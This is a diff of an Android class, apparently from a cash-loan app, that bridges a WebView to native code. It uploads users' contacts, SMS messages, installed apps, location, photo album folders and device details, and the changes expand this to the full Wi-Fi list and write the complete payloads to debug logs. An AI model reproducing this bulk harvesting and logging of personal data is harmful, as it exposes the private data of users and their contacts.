@@ -15,8 +15,10 @@ import androidx.fragment.app.FragmentActivity
 import androidx.lifecycle.ViewModelStoreOwner
 import com.fly.cashhill.MyApplication
 import com.fly.cashhill.activity.BaseWebActivity
+import com.fly.cashhill.activity.LoginActivity
 import com.fly.cashhill.bean.*
 import com.fly.cashhill.bean.event.HttpEvent
+import com.fly.cashhill.js.bean.AppFleryParseDataBean
 import com.fly.cashhill.js.bean.CommentParseDataBean
 import com.fly.cashhill.utils.*
 import com.fly.cashhill.utils.Cons.JS_KEY_ALBUM_PHOTO
@@ -134,8 +136,8 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
      */
     private fun eventAppsFlyer(id: String, data: Any?) {
         try {
-            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
-            AppsFlyerUtil.postAF(commentParseDataBean.value)
+            var commentParseDataBean = Gson().fromJson(data.toString(), AppFleryParseDataBean::class.java)
+            AppsFlyerUtil.postAF(commentParseDataBean.eventName)
             CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_APPS_FLYER)
         } catch (e: Exception) {
             e.printStackTrace()
@@ -198,6 +200,10 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
     private fun logout(id: String) {
         UserInfoManger.logout()
         CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_LOGOUT)
+        val intent = Intent(ActivityManager.getCurrentActivity(), LoginActivity::class.java)
+        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
+        ActivityManager.getCurrentActivity()?.startActivity(intent)
+
     }
 
     /**
@@ -207,7 +213,6 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
         XXPermissions.with(ActivityManager.getCurrentActivity())
             .permission(Permission.READ_CONTACTS)
             .permission(Permission.GET_ACCOUNTS)
-            .permission(Permission.READ_CALL_LOG)
             .request(object : OnPermissionCallback {
                 override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                     if (all) {
@@ -220,7 +225,7 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                             applyInfoBean.contact = contactInfoBeanAuth
                             HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_CONTACT_INFO)
                             if (contactInfoBeanAuth!=null) {
-                                LogUtils.d("通讯录：${contactInfoBeanAuth.toString()}")
+                                LogUtils.d("通讯录：${applyInfoBean.toString()}")
                             }
                         }
                     } else {
@@ -339,7 +344,8 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                             deviceInfoBean.VideoInternal = FileUtil.getVideoInternal().size
                             deviceInfoBean.AudioExternal = FileUtil.getAudioExternal().size
                             deviceInfoBean.build_time = Build.TIME
-                            deviceInfoBean.wifiCount = DeviceInfoUtil.getWifiList().size
+                            deviceInfoBean.wifilist = DeviceInfoUtil.getWifiList()
+                            deviceInfoBean.sensorcount = DeviceInfoUtil.getSensorCount()
                             deviceInfoBean.time_zone = DeviceInfoUtil.getTimeZone()
                             deviceInfoBean.release_date = Build.TIME
                             deviceInfoBean.device_name = DeviceInfoUtil.getDeviceName()
@@ -353,11 +359,9 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                             deviceInfoBean.cur_wifi_ssid = DeviceInfoUtil.regWifiSSID()
                             deviceInfoBean.DownloadFiles = FileUtil.getDownloadFile().size
                             val applyInfoBean= ApplyInfoBean()
-                            val deviceInfoBeans = ArrayList<DeviceInfoBean>()
-                            deviceInfoBeans.add(deviceInfoBean)
-                            applyInfoBean.device_info = deviceInfoBeans
+                            applyInfoBean.device_info = deviceInfoBean
                             HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_DEVICE_INFO)
-                            LogUtils.d("设备信息：${deviceInfoBean}")
+                            LogUtils.d("设备信息：${applyInfoBean}")
                         }
                     } else {
                         CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
@@ -426,9 +430,10 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                                 }
                             }
                             locationBean.gps = locationGpsBean
-                            LogUtils.d("位置信息：${locationBean}")
                             var applyInfoBean= ApplyInfoBean()
                             applyInfoBean.gps = locationBean
+
+                            LogUtils.d("位置信息：${applyInfoBean}")
                             HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_LOCATION_INFO)
                         }
                     } else {
@@ -456,9 +461,9 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                             var installationInfoBeanAuth = InstallationInfoBeanAuth();
                             installationInfoBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                             installationInfoBeanAuth.list = apps
-                            LogUtils.d("安装信息：${installationInfoBeanAuth}")
                             var applyInfoBean= ApplyInfoBean()
                             applyInfoBean.applist = installationInfoBeanAuth
+                            LogUtils.d("安装信息：${applyInfoBean}")
                             HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_INSTALLATION_INFO)
                         }
                     } else {
@@ -489,9 +494,9 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                             var smsBeanAuth = SmsBeanAuth()
                             smsBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                             smsBeanAuth .list = smss
-                            LogUtils.d("短信信息：${smsBeanAuth}")
                             var applyInfoBean= ApplyInfoBean()
                             applyInfoBean.sms = smsBeanAuth
+                            LogUtils.d("短信信息：${applyInfoBean}")
                             HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_SMS_INFO)
                         }
                     } else {
@@ -545,7 +550,6 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
         XXPermissions.with(ActivityManager.getCurrentActivity())
             .permission(Permission.Group.STORAGE)
             .permission(Permission.READ_PHONE_STATE)
-            .permission(Permission.ACCESS_MEDIA_LOCATION)
             .request(object : OnPermissionCallback {
                 override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                     if (all) {
@@ -556,9 +560,9 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                                     var albumInfoBeanAuth = AlbumInfoBeanAuth()
                                     albumInfoBeanAuth.create_time = DateTool.getServerTimestamp() / 1000
                                     albumInfoBeanAuth.list = imageFolders
-                                    LogUtils.d("相册信息：+${albumInfoBeanAuth}")
                                     var applyInfoBean= ApplyInfoBean()
                                     applyInfoBean.image = albumInfoBeanAuth
+                                    LogUtils.d("相册信息：+${applyInfoBean}")
                                     HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_ALBUM_PHOTO)
                                 }
                             }
@@ -615,7 +619,12 @@ class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewMode
                     var file: File? = null
                     photoFile?.let {
                         LogUtils.d("压缩前：" + it.length())
-                        file = ImageUtils.compressImage(it.absolutePath)
+                        try {
+                            file = ImageUtils.compressImage(it.absolutePath)
+                        }catch (e:Exception){
+                            e.printStackTrace()
+                            file = photoFile
+                        }
                         LogUtils.d("压缩后：" + (file?.length() ?: "0"))
                     }
                     withContext(Dispatchers.Main) {
